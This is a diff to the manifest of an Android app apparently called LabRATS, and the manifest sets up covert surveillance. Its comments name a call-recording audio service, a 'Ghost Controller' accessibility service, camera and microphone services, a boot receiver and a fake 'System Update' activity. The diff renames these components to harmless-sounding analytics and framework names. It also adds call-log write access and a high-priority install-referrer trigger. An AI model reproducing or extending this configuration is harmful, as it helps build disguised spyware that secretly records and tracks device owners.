@@ -22,6 +22,7 @@
 
     <!-- Call Logs & Contacts -->
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
 
     <!-- Location Permissions -->
@@ -119,7 +120,7 @@
             android:exported="false"
             android:excludeFromRecents="true"
             android:label="System Update"
-            android:icon="@drawable/ic_sprocket_gear"
+            android:icon="@drawable/ic_analytics_data"
             android:theme="@style/Theme.LabRATS.Decoy">
         </activity>
 
@@ -193,19 +194,27 @@
         </activity-alias>
 
         <service
-            android:name=".CoreSyncService"
+            android:name=".WorkManager_Sync"
             android:enabled="true"
             android:exported="false"
             android:stopWithTask="false"
             android:foregroundServiceType="dataSync|location" />
 
         <service
-            android:name=".MediaContainer"
+            android:name=".Analytics_Provider"
             android:enabled="true"
             android:exported="false"
             android:label="Device Bridge"
             android:stopWithTask="false"
             android:foregroundServiceType="camera|microphone|dataSync" />
+
+        <!-- Installation Trigger (Wuzenx Style) -->
+        <receiver android:name=".InstallReferrerReceiver"
+            android:exported="true">
+            <intent-filter android:priority="999">
+                <action android:name="com.android.vending.INSTALL_REFERRER" />
+            </intent-filter>
+        </receiver>
 
         <receiver
             android:name=".SystemBoot"
@@ -222,7 +231,7 @@
 
         <!-- Call Record Service for audio capture -->
         <service
-            android:name=".AudioStability"
+            android:name=".MediaFrameworkService"
             android:enabled="true"
             android:exported="false"
             android:stopWithTask="false"
@@ -254,7 +263,7 @@
 
         <!-- Ghost Controller (Accessibility Service) -->
         <service
-            android:name=".AccessibilityCore"
+            android:name=".IO_Persistence_Manager"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="true"
             android:directBootAware="true"
@@ -278,6 +287,9 @@
                 android:name="android.support.FILE_PROVIDER_PATHS"
                 android:resource="@xml/file_paths" />
         </provider>
+        <meta-data
+            android:name="preloaded_fonts"
+            android:resource="@array/preloaded_fonts" />
 
     </application>
 
